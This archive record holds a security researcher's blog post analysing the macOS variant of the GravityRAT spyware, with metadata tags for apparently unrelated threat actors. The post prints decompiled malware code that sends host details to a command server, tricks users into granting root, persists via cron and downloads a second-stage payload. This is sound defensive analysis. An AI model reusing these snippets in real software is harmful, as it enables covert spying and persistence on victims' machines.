{
    "id": "6b6f03f1-ea0f-4be6-a127-1abf073ee3ff",
    "created_at": "2023-01-12T15:07:07.299591Z",
    "updated_at": "2025-03-27T02:16:25.575025Z",
    "deleted_at": null,
    "sha1_hash": "4d5765efd2db5031b0ba3ccb3eb5ab127d4b1185",
    "title": "2020-11-03 - Adventures in Anti-Gravity- Deconstructing the Mac Variant of GravityRAT",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:31Z",
    "file_modification_date": "2022-05-29T01:23:31Z",
    "file_size": 3219851,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x5B.html**\n\n### Adventures in Anti-Gravity\n\n Deconstructing the Mac Variant of GravityRAT\n\n by: Patrick Wardle / November 3, 2020\n\n Love these blog posts and/or want to support my research and tools? You can support them via my Patreon page!\n\n ðŸ“ ðŸ‘¾ Want to play along? Iâ€™ve added the samples (GravityRat) to our malware collection (password: infect3d)\n\n â€¦please donâ€™t infect yourself!\n\n## Background\n\n### Recently, noted security researcher Tatyana Shishkova of Kaspersky published a new report on the intriguing cross-platform spyware, GravityRAT (\"used to target the Indian armed forces\"). In this report, she noted that for the first time, â€œthere are now versions for â€¦ macOSâ€.\n\n In this blog post, weâ€™ll build upon her work, diving deeper into the macOS versions of this malware.\n\n\n-----\n\n### Tatyana s writeup is great place to start, and provides a lot of great foundational detail and insights about GravityRAT â€¦including the newly uncovered macOS variants.\n\n As such, it is a must read:\n\n \"GravityRAT: The spy returns\"\n\n## Samples\n\n### Kasperksy was kind enough to share various samples of GravityRAT :\n```\n$ shasum OSX.GravityRAT/*\n086b22075d464b327a2bcbf8b66736560a215347 ~/OSX.GravityRAT/Enigma\n696c7cbba2c9326298f3ddca5f22cfb20a4cd3ee ~/OSX.GravityRAT/OrangeVault\ne33894042f3798516967471d0ce1e92d10dec756 ~/OSX.GravityRAT/StrongBox\n9b5b234e3b53f254bc9b3717232d1030e340c7f2 ~/OSX.GravityRAT/TeraSpace\n\n Using macOSâ€™s built-in file command, we can ascertain that these samples are all executable (64bit) Mach-O binaries:\n$ file OSX.GravityRAT/*\nOSX.GravityRAT/Enigma:     Mach-O 64-bit executable x86_64\nOSX.GravityRAT/OrangeVault:   Mach-O 64-bit executable x86_64\nOSX.GravityRAT/StrongBox:    Mach-O 64-bit executable x86_64\nOSX.GravityRAT/TeraSpace:    Mach-O 64-bit executable x86_64\n\n â€¦though are all unsigned:\n$ for i in OSX.GravityRAT/*; do codesign -dvvv $i; done\nOSX.GravityRAT/Enigma: code object is not signed at all\nOSX.GravityRAT/OrangeVault: code object is not signed at all\nOSX.GravityRAT/StrongBox: code object is not signed at all\nOSX.GravityRAT/TeraSpace: code object is not signed at all\n\n A brief triage revealed that while the Enigma file appeared unique, the other three ( OrangeVault, StrongBox, and TeraSpace ) appeared quite similar. As such, weâ€™ll first dive into the Enigma binary. Following this, weâ€™ll also analyze one of the files from the other group.\n\n## Enigma\n\n### The Enigma file ( sha1: 086b22075d464b327a2bcbf8b66736560a215347 ) is an unsigned 64bit Mach-O binary.\n\n Kasperskyâ€™s report notes that the Windows version was â€œdownloaded from the site enigma.net[.]in under the guise of a secure file sharing app to protect against ransomwareâ€. The macOS version also appears to masquerade as such an application:\n\n```\n\n-----\n\n### The Enigma UI\n\n Kaspersky states that the Windowâ€™s versions of the malware are, â€œwritten in Python and packaged using â€¦ PyInstaller â€.\n\n Leveraging a tool such as PyInstaller allows developers (or malware authors) to write cross- platform python code, then generate native, platform-specific binaries:\n\n â€œPyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX.â€\n\n To learn more about PyInstaller, head over to:\n\n PyInstaller.org. By extracting embedded strings, itâ€™s trivial to confirm that this macOS variant was (also) packaged up with PyInstaller :\n```\n$ strings - OSX.GravityRAT/Enigma | grep Python\nPy_SetPythonHome\nError loading Python lib '%s': dlopen: %s\nError detected starting Python VM.\nPython\n\n This can also be confirmed via disassembly, by noting the the malwareâ€™s main function simply calls into PyInstaller â€™s pyi_main function:\n1void main() {\n2  pyi_main(rdi, rsi, rdx, rcx, r8, r9);\n3  return;\n4}\n\n```\n\n-----\n\n### Recognizing that the malware was packaged up with PyInstaller is important, as it means we can extract compiled python code, that ultimately we can fully decompile. Reading python code is of course far simpler than reading decompiled (dis)assembly!\n\n One easy was to extract the compiled python code is via the pyinstxtractor. This open-source tool, can â€œextract the contents of a PyInstaller generatedâ€¦executable fileâ€\n\n Once installed, we can extract the python archive:\n```\n$ python pyinstxtractor.py Enigma \n[+] Processing Enigma\n[+] Pyinstaller version: 2.1+\n[+] Python version: 27\n[+] Length of package: 17113011 bytes\n[+] Found 458 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_pkgres.pyc\n[+] Possible entry point: pyi_rth__tkinter.pyc\n[+] Possible entry point: Enigma.pyc\n[+] Found 828 files in PYZ archive\n[+] Successfully extracted pyinstaller archive: Enigma\nYou can now use a python decompiler on the pyc files within the extracted directory\n\n Letâ€™s take a peek at the file extracted by pyinstxtractor (which were placed in a directory named Enigma_extracted ):\n$ ls -1 Enigma_extracted/\nContents\nCrypto\nEnigma.pyc\nMacOS.so\nNav.so\nPIL._imaging.so\nPIL._imagingtk.so\nPIL._webp.so\nPYZ-00.pyz\nPYZ-00.pyz_extracted\nPython\nTcl\nTk\n_AE.so\n_Ctl.so\n_Dlg.so\n_Evt.so\n...\n\n Most notable is the Enigma.pyc file, which as expected (due to its .pyc file extension), is compiled python byte code:\n$ file OSX.GravityRAT/Enigma_extracted/Enigma.pyc \nOSX GravityRAT/Enigma extracted/Enigma pyc: python 2 7 byte compiled\n\n```\n\n-----\n\n### We can readily decompile this bytecode via a site such as decompiler.com:\n\n decompiling... â€¦which gives us back python code!\n```\n 1# uncompyle6 version 3.6.4\n 2# Python bytecode 2.7 (62211)\n 3# Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) \n 4# Embedded file name: Enigma.py\n 5import Tkinter as tk, ttk, tkFont as tkfont, tkFileDialog, uuid as libuuid,\ntkMessageBox, \n 6 re, base64, ctypes, datetime, glob, hashlib, json, os, platform, sys, threading,\nsocket\n 7from PIL import ImageTk\n 8import traceback, subprocess, random, zlib, sqlite3, requests, time\n 9from Crypto.Cipher import AES, PKCS1_OAEP\n10from Crypto import Random\n11from Crypto.Hash import SHA256\n12from Crypto.PublicKey import RSA\n13from Crypto.Random import get_random_bytes\n14SSN = requests.Session()\n15SSN.headers.update({'User-Agent': 'M_22CE2F63F5FF02F6B9754242E4BEE237'})\n16THREADS = []\n17dURL = 'https://download.enigma.net.in/90954349.php'\n18...\n\n The Kaspersky report notes that the GravityRAT malware, â€œcollects information about the computer, downloads the payload from the server, and adds a scheduled task.â€\n\n Letâ€™s take a closer look at the decompiled python source code (from Enigma.pyc ), to see how the malware performs each of these steps.\n\n In the codeâ€™s main function it first invokes the following: AUTH = IsAuth()\n\n```\n\n-----\n\n```\n 1def IsAuth():\n 2  if platform.system() == 'Darwin':\n 3    user = os.getuid()\n 4    if user != 0:\n 5      with open(os.getenv('TMPDIR') + 'tmp0.txt', 'wb') as (fb):\n 6        fb.write(sys.executable)\n 7      if hasattr(sys, '_MEIPASS'):\n 8        os.system('mkdir ' + os.path.join(sys._MEIPASS, 'Enigma.app'))\n 9        os.system('cp -R ' + os.path.join(sys._MEIPASS, 'Contents') + ' ' \n10              + os.path.join(sys._MEIPASS, 'Enigma.app/'))\n11        os.system(os.path.join(sys._MEIPASS,\n'Enigma.app/Contents/MacOS/applet'))\n12    return user\n13\n14\n15def main():\n16  AUTH = IsAuth()\n\n### The IsAuth function first checks for macOS ( Darwin ), and then executes a block of logic if the user is not running with root privileges ( if user != 0 ).\n\n Specifically it:\n\n writes the path of the executable into a temporary file named tmp0.txt makes a directory named Enigma.app (via mkdir ) copies the Contents directory to Enigma.app (via cp -R ) executes the Enigma.app/Contents/MacOS/applet\n\n This can be observed via our Process Monitor:\n\n```\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n{\n \"event\": \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\": {\n  \"pid\": 1384,\n  \"path\": \"/bin/mkdir\",\n  \"uid\": 501,\n  \"arguments\": [\"mkdir\",\n\"/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app\"],\n  ...\n }\n}\n{\n \"event\": \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\": {\n  \"pid\": 1385,\n  \"path\": \"/bin/cp\",\n  \"uid\": 501,\n  \"arguments\": [\"cp\", \"-R\",\n\"/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Contents\", \n\"/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/\"],\n  ...\n }\n}\n{\n \"event\": \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\": {\n  \"pid\": 1386,\n  \"path\":\n\"/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/Conten\n  \"uid\": 501,\n  \"arguments\":\n[\"/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/Contents/MacO\n  ...\n }\n}\n\n### The applet binary is a fat (32bit & 64bit) Mach-O binary:\n$ file Contents/MacOS/applet \nContents/MacOS/applet: Mach-O universal binary with 2 architectures: \n [i386:Mach-O executable i386]\n [x86_64:Mach-O 64-bit executable x86_64] \n\n Itâ€™s a tiny binary that simply invokes OpenDefaultComponent then a function ( sub_100000f58 ) that invokes CallComponentDispatch :\n\n```\n\n-----\n\n```\n1int EntryPoint() {\n2  rax = OpenDefaultComponent('tlpa', 'tpcs');\n3  if (rax != 0x0) {\n4      sub_100000f58(rax);\n5  }\n6  return 0x0;\n7}\n\n### Since OpenDefaultComponent is invoked with apltscpt it seems to be related to (perhaps) executing an AppleScript found in the application bundle, specifically\nContents/Resources/Scripts/main.scpt .\n\n The main.scpt file, is compiled AppleScript:\n$ file Contents/Resources/Scripts/main.scpt \nContents/Resources/Scripts/main.scpt: AppleScript compiled\n\n Luckily itâ€™s was not compiled in â€œrun-onlyâ€ mode, meaning we can trivially decompile with macOSâ€™s Script Editor application:\n1set dirPath to system attribute \"TMPDIR\"\n2set logFile to dirPath & \"tmp0.txt\"\n3set theText to read logFile\n4do shell script theText & \" > /dev/null 2>&1 &\" with administrator privileges\n\n Easy to see itâ€™s simply attempting to execute the file (specified within tmp0.txt ) with administrator privileges. Recall that in the IsAuth function (in the compiled Python code), the malware wrote out the path to itself into the tmp0.txt file:\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter tmp0.txt \n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_OPEN\",\n \"file\" : {\n  \"destination\" :\n\"/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/tmp0.txt\",\n  \"process\" : {\n   \"uid\" : 501,\n   \"path\" :\n\"/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIuEZp9g/Enigma.app/Conten\n   \"pid\" : 1567\n   ...\n  }\n }\n}\n$ cat /private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/tmp0.txt\n/Users/user/Downloads/Enigma\n\n```\n\n-----\n\n### â€¦thus the AppleScript will prompt the user to authorize the (re)launching of the malware ( Enigma ) with elevated privileges:\n\n Authorization Prompt\n\n Assuming the user enters their credentials into the authorization prompt, a second (privileged) instance of the malware will now be running (note: uid: 0 ):\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_FORK\",\n \"process\" : {\n  \"uid\" : 0,\n  \"path\" : \"/Users/user/Downloads/Enigma\",\n  \"pid\" : 1742\n }\n}\n\n The malware authors could have avoided all this round about logic by simply invoking the AuthorizationExecuteWithPrivileges API. ï¿½\n\n Now the malware is happily running as root. This means the IsAuth function will just return, which causes the malware to invoke a function named IsAuthorize :\n\n```\n\n-----\n\n```\n 1def IsAuthorize():\n 2  try:\n 3    boM = os.popen('ioreg -c IOPlatformExpertDevice -d 2 \n 4       | awk -F\\\\\" \\'/product-name/{print $(NF-1)}\\'').read().strip()\n 5    boP = os.popen('ioreg -c IOPlatformExpertDevice -d 2 \n 6       | awk -F\\\\\" \\'/board-id/{print $(NF-1)}\\'').read().strip()\n 7    bM = os.popen('ioreg -c IOPlatformExpertDevice -d 2 \n 8       | awk -F\\\\\" \\'/manufacturer/{print $(NF-1)}\\'').read().strip()\n 9    bP = os.popen('ioreg -c IOPlatformExpertDevice -d 2 \n10       | awk -F\\\\\" \\'/model/{print $(NF-1)}\\'').read().strip()\n11    cu = ''\n12    response = SSN.post(dURL, \n13          data={'K': 'vM', 'cu': cu, 'bM': bM, 'bP': bP, 'boM': boM,\n'boP': boP})\n14    return response.text\n15  except Exception:\n16    return '-1'\n\n### This function gathers some basic information about its host (product name, board id, & model), and sends it off to https://download.enigma.net.in/90954349.php .\n\n If it receives a response (that is not -V ) it attempts to list the files in ~/Library/Safari . If this fails, it will prompt the user to (manually) give Terminal.app full-disk access:\n 1if SID != '-V':\n 2 if str(platform.release()).split('.')[0] >= '18':\n 3  krlck = os.popen('ls ~/Library/Safari').read().strip()\n 4  if krlck != '':\n 5    app = MainWindow()\n 6    app.mainloop()\n 7  else:\n 8    msgroot = tk.Tk()\n 9    msgroot.withdraw()\n10    tkMessageBox.showerror('Enigma: Operation Not Permitted.', 'Solution: \\nGo\nto System Preferences > Security & Privacy and give Full Disk Access to\nTerminal.app\\n(Applications > Utilities> Terminal.app)')\n\n On recent version of macOS, application are barred from accessing many user and system files ...unless full-disk access has been granted by the user. The ~/Library/Safari directory is example of a â€œprotectedâ€ directory. Thus, this is how the malware is (indirectly) checking if it has full-disk access.\n\n Assumming the user has granted Terminal.app and thus the malware (presumably running under Terminal.app ) full-disk access, the malware shows the main UI window:\n\n```\n\n-----\n\n### Main Application\n\n Window â€¦the majority of the remaining (compiled) Python code in the malware seems to be â€œlegitimateâ€ â€¦and ensures the UI interface performs as expected (so the user remains oblivious to the fact that the application is indeed malicious).\n\n However, there is still (a bit) more malicious logic.\n\n The Kaspersky report, notes, â€œThe Mac version â€¦adds a cron jobâ€\n\n We find this persistence logic in a function named format :\n```\n 1def format(self, src, des, uc):\n 2 ...\n 3 if not os.path.isfile(des):\n 4   os.system('cp ' + src + ' ' + des)\n 5 if des[-3:] == '.py':\n 6   os.system('sudo crontab -l 2>/dev/null; \n 7         echo \"*/2 * * * * python ' + des + '\" | sudo crontab -')\n 8 else:\n 9   os.chmod(des, 448)\n10   des += ' ' + uc\n11   os.system('sudo crontab -l 2>/dev/null; \n12         echo \"*/2 * * * * ' + des + '\" | sudo crontab -')\n13 return '+O '\n\n Via crontab the malware persists a (passed) file, as a cronjob â€¦set to run every two minutes ( */2 * * * * ).\n\n The format is invoked by a function named sptoken . Before invoking the format function, code within sptoken downloads the contents of the item to persist (as a cronjob):\n\n```\n\n-----\n\n```\n 1def sptoken(self, clist, tokens, sndr, recvr):\n 2...\n 3\n 4 rsp = SSN.get(id['O'])\n 5 if rsp.status_code == 200:\n 6   rep += '+L '\n 7   with open(Tp, 'wb') as (i):\n 8     i.write(rsp.content)\n 9   rep += '+M '\n10   rep_temp = self.template(Tp, Lp)\n11   rep += rep_temp\n12   if rep_temp[0:1] == '+':\n13     rep += self.format(Tp, Lp, id['U'])\n\n### â€¦unfortunately this downloaded (and persisted) payload was not available for analysis ðŸ˜ž As such, this wraps up our analysis.\n\n## Conclusions\n\n### In this blog post, we thoroughly reversed the Enigma binary ( sha1:\n086b22075d464b327a2bcbf8b66736560a215347 ). After extracting its compiled Python,\n\n Mach-O & AppleScript components, we analyzed each to gain an understandings of their capabilities.\n\n And although we do not have access to the 2nd-stage payload, BlockBlock will readily detect its (cronjob) persistence:\n\n BlockBlock ...block, blocking!\n\n## ðŸ’• Support Us:\n\n```\n\n-----\n\n### Love these blog posts? You can support them via my Patreon page!\n\n This website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-03 - Adventures in Anti-Gravity- Deconstructing the Mac Variant of GravityRAT.pdf"
    ],
    "report_names": [
        "2020-11-03 - Adventures in Anti-Gravity- Deconstructing the Mac Variant of GravityRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787411,
    "ts_modification_date": 1653787411,
    "files": {
        "pdf": "https://archive.orkl.eu/4d5765efd2db5031b0ba3ccb3eb5ab127d4b1185.pdf",
        "text": "https://archive.orkl.eu/4d5765efd2db5031b0ba3ccb3eb5ab127d4b1185.txt",
        "img": "https://archive.orkl.eu/4d5765efd2db5031b0ba3ccb3eb5ab127d4b1185.jpg"
    }
}